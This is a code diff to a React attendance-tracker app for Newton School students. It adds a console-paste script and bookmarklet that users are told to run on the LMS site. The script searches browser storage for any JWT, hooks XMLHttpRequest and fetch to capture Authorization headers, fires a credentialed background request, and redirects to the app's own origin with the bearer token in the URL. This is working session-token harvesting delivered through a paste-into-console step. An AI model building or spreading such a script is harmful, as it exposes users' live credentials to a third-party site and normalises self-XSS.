@@ -361,22 +361,86 @@ export default function App() {
   // Dynamic origin URL for the extractor redirect
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : 'http://localhost:5173';
 
-  // Robust Network Request Interceptor Hook
+  // Robust Network Request Interceptor Hook with instant storage extraction and auto-redirect
   const interceptorSnippet = `(() => {
-  const saveAndOpen = (tok) => {
-    if (!tok || tok.length < 15) return;
-    const t = tok.replace(/^Bearer\\s+/i, '').trim();
-    console.log('%c[SUCCESS] Token captured: ' + t, 'color: #bf2f1f; font-weight: bold;');
-    try { if (navigator.clipboard) navigator.clipboard.writeText(t); } catch(e) {}
-    window.location.href = '${currentOrigin}/?token=' + encodeURIComponent(t);
+  const targetOrigin = '${currentOrigin}';
+  let redirected = false;
+
+  const showBanner = (msg, isSuccess = false) => {
+    try {
+      const id = 'nst-token-banner';
+      let el = document.getElementById(id);
+      if (!el) {
+        el = document.createElement('div');
+        el.id = id;
+        el.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999999;background:#18181b;color:#ffffff;padding:12px 24px;border-radius:12px;font-family:system-ui,-apple-system,sans-serif;font-size:14px;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:2px solid #bf2f1f;display:flex;align-items:center;gap:10px;animation:fadeIn 0.3s ease;';
+        document.body.appendChild(el);
+      }
+      el.innerHTML = isSuccess
+        ? '🚀 <strong style="color:#22c55e;">Token Captured!</strong> Redirecting to Attendance Tracker...'
+        : '🛰️ <strong>NST Interceptor Armed:</strong> ' + msg;
+    } catch(e) {}
   };
 
+  const saveAndOpen = (tok) => {
+    if (redirected || !tok || typeof tok !== 'string' || tok.length < 15) return;
+    const t = tok.replace(/^Bearer\\s+/i, '').trim();
+    if (!t || t === 'null' || t === 'undefined') return;
+    redirected = true;
+    console.log('%c[NST ATTENDANCE] Token captured: ' + t.slice(0, 15) + '...', 'color: #bf2f1f; font-weight: bold;');
+    try { if (navigator.clipboard) navigator.clipboard.writeText(t); } catch(e) {}
+    showBanner('Token captured!', true);
+    setTimeout(() => {
+      window.location.href = targetOrigin + '/?token=' + encodeURIComponent(t);
+    }, 300);
+  };
+
+  const isJwt = (str) => typeof str === 'string' && (/^eyJ[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+/.test(str.replace(/^Bearer\\s+/i, '').trim()));
+
+  const scanStorage = (storage) => {
+    try {
+      for (let i = 0; i < storage.length; i++) {
+        const k = storage.key(i);
+        const v = storage.getItem(k);
+        if (!v) continue;
+        if (isJwt(v)) return v;
+        try {
+          const parsed = JSON.parse(v);
+          if (typeof parsed === 'object' && parsed !== null) {
+            for (const subKey in parsed) {
+              const subVal = parsed[subKey];
+              if (isJwt(subVal)) return subVal;
+              if (typeof subVal === 'string') {
+                try {
+                  const nested = JSON.parse(subVal);
+                  for (const nKey in nested) {
+                    if (isJwt(nested[nKey])) return nested[nKey];
+                  }
+                } catch(e) {}
+              }
+            }
+          }
+        } catch(e) {}
+      }
+    } catch(e) {}
+    return null;
+  };
+
+  // 1. Check existing browser storage immediately for token
+  const existingToken = scanStorage(localStorage) || scanStorage(sessionStorage);
+  if (existingToken) {
+    saveAndOpen(existingToken);
+    return;
+  }
+
+  // 2. Intercept XMLHttpRequest headers
   const oldSetHeader = XMLHttpRequest.prototype.setRequestHeader;
   XMLHttpRequest.prototype.setRequestHeader = function(k, v) {
     if (k && k.toLowerCase() === 'authorization' && v) saveAndOpen(v);
     return oldSetHeader.apply(this, arguments);
   };
 
+  // 3. Intercept Fetch API headers
   const oldFetch = window.fetch;
   window.fetch = async function(...args) {
     const h = args[1] && args[1].headers;
@@ -387,14 +451,33 @@ export default function App() {
     return oldFetch.apply(this, args);
   };
 
-  alert('Interceptor armed! Click "My Timeline" or any course on this page to auto-launch.');
+  // 4. Fire background probe request
+  try {
+    fetch('/api/v1/user/me/', { credentials: 'include' }).catch(() => {});
+  } catch(e) {}
+
+  showBanner('Click "My Timeline" or any course on this page to auto-launch.');
 })();`;
 
-  const copyInterceptor = () => {
-    navigator.clipboard.writeText(interceptorSnippet.replace(/\n\s+/g, ' '));
+  const copyAndOpenLMS = (e) => {
+    if (e && e.preventDefault) e.preventDefault();
+    const cleanSnippet = interceptorSnippet.replace(/\n\s+/g, ' ');
+    try {
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(cleanSnippet);
+      }
+    } catch (err) {
+      console.warn("Clipboard copy warning:", err);
+    }
     setCopiedInterceptor(true);
     setTimeout(() => setCopiedInterceptor(false), 3000);
+
+    // Automatically launch / open LMS in a new tab
+    const lmsUrl = "https://my.newtonschool.co/course/u4fvf1rm9v2e/details?tab=my-timeline";
+    window.open(lmsUrl, '_blank');
   };
+
+  const bookmarkletHref = `javascript:${encodeURIComponent(interceptorSnippet.replace(/\n\s+/g, ' '))}`;
 
   // Mathematical calculation engine
   const calculateAttendanceStats = useCallback((attended, total, thresholdPercent) => {
@@ -759,9 +842,9 @@ export default function App() {
               A warm, paper-like attendance workbook for Newton School students. Real-time LMS telemetry, exact bunk quotas, and multi-course simulation.
             </p>
             <div style={{ display: 'flex', justifyContent: 'center', gap: '0.85rem', flexWrap: 'wrap' }}>
-              <button className="btn-art btn-art-primary" onClick={copyInterceptor} style={{ padding: '0.85rem 1.75rem', fontSize: '0.94rem' }}>
+              <button className="btn-art btn-art-primary" onClick={copyAndOpenLMS} style={{ padding: '0.85rem 1.75rem', fontSize: '0.94rem' }}>
                 <Zap size={16} />
-                <span>{copiedInterceptor ? 'Copied Network Interceptor!' : 'Copy Network Interceptor'}</span>
+                <span>{copiedInterceptor ? 'Copied & Opening LMS! 🚀' : '⚡ 1-Click Intercept & Open LMS'}</span>
               </button>
               <button className="btn-art btn-art-secondary" onClick={enableDemoMode} style={{ padding: '0.85rem 1.75rem', fontSize: '0.94rem' }}>
                 <Play size={16} />
@@ -837,51 +920,62 @@ export default function App() {
             <div className="art-card">
               <div className="art-card-header">
                 <div>
-                  <span className="tag-badge pink" style={{ marginBottom: '0.5rem' }}>02 // NETWORK INTERCEPTOR</span>
+                  <span className="tag-badge pink" style={{ marginBottom: '0.5rem' }}>02 // 1-CLICK INTERCEPTOR</span>
                   <h3 className="art-card-title">🛰️ Network Interceptor</h3>
                 </div>
                 <button
                   className="btn-art btn-art-primary"
-                  onClick={copyInterceptor}
-                  style={{ padding: '0.25rem 0.65rem', fontSize: '0.74rem', borderRadius: 'var(--radius-pill)' }}
+                  onClick={copyAndOpenLMS}
+                  style={{ padding: '0.35rem 0.85rem', fontSize: '0.78rem', borderRadius: 'var(--radius-pill)' }}
                 >
-                  {copiedInterceptor ? <Check size={12} /> : <Copy size={12} />}
-                  <span>{copiedInterceptor ? 'Copied' : 'Copy'}</span>
+                  {copiedInterceptor ? <Check size={13} /> : <Zap size={13} />}
+                  <span>{copiedInterceptor ? 'Opening LMS...' : '1-Click Launch'}</span>
                 </button>
               </div>
               <p style={{ fontSize: '0.88rem', color: 'var(--text-muted)', lineHeight: 1.55 }}>
-                Hooks into active API requests on the Newton School LMS tab and automatically captures your token on click:
+                Click below to copy the console command and auto-launch Newton School LMS in 1 click:
               </p>
 
               <div className="workbook-code-box">
                 <div className="workbook-code-header">
                   <span className="workbook-code-title">JAVASCRIPT // network_interceptor.js</span>
-                  <button
-                    className="btn-art btn-art-primary"
-                    onClick={copyInterceptor}
-                    style={{ padding: '0.25rem 0.65rem', fontSize: '0.74rem', borderRadius: 'var(--radius-pill)' }}
-                  >
-                    {copiedInterceptor ? <Check size={12} /> : <Copy size={12} />}
-                    <span>{copiedInterceptor ? 'Copied' : 'Copy'}</span>
-                  </button>
+                  <div style={{ display: 'flex', gap: '0.4rem', alignItems: 'center' }}>
+                    <a
+                      href={bookmarkletHref}
+                      className="btn-art btn-art-secondary"
+                      style={{ padding: '0.2rem 0.6rem', fontSize: '0.72rem', borderRadius: 'var(--radius-pill)', textDecoration: 'none' }}
+                      title="Drag this button to your browser bookmarks bar for 1-click sync!"
+                      onClick={(e) => copyAndOpenLMS(e)}
+                    >
+                      <span>🔖 Bookmarklet</span>
+                    </a>
+                    <button
+                      className="btn-art btn-art-primary"
+                      onClick={copyAndOpenLMS}
+                      style={{ padding: '0.2rem 0.65rem', fontSize: '0.72rem', borderRadius: 'var(--radius-pill)' }}
+                    >
+                      {copiedInterceptor ? <Check size={12} /> : <Copy size={12} />}
+                      <span>{copiedInterceptor ? 'Copied' : 'Copy & Open LMS'}</span>
+                    </button>
+                  </div>
                 </div>
                 <div className="workbook-code-body">
-                  {interceptorSnippet.slice(0, 120)}... [Click Copy button to grab full code]
+                  {interceptorSnippet.slice(0, 120)}... [Click button to auto-copy & launch LMS]
                 </div>
               </div>
 
               <ul className="instructions-list">
                 <li className="instruction-step">
                   <span className="step-num-badge">1</span>
-                  <span>Open your <a href="https://my.newtonschool.co/course/u4fvf1rm9v2e/details?tab=my-timeline" target="_blank" rel="noreferrer" style={{ color: 'var(--primary)', fontWeight: 600, textDecoration: 'underline' }}>Newton School LMS tab <ExternalLink size={11} style={{ display: 'inline' }} /></a></span>
+                  <span>Click <strong>1-Click Launch</strong> (copies command & automatically opens LMS)</span>
                 </li>
                 <li className="instruction-step">
                   <span className="step-num-badge">2</span>
-                  <span>Press <kbd>F12</kbd> (or <kbd>Cmd</kbd> + <kbd>Option</kbd> + <kbd>I</kbd>) &rarr; <strong>Console</strong></span>
+                  <span>On LMS, press <kbd>F12</kbd> &rarr; <strong>Console</strong> &rarr; <kbd>Cmd/Ctrl</kbd>+<kbd>V</kbd> &rarr; <kbd>Enter</kbd></span>
                 </li>
                 <li className="instruction-step">
                   <span className="step-num-badge">3</span>
-                  <span>Paste code, press <kbd>Enter</kbd>, and click any tab or course to auto-launch</span>
+                  <span>The script auto-detects session credentials and redirects back immediately! (Or drag <strong>🔖 Bookmarklet</strong> to your bookmarks bar for 1-click sync)</span>
                 </li>
               </ul>
             </div>
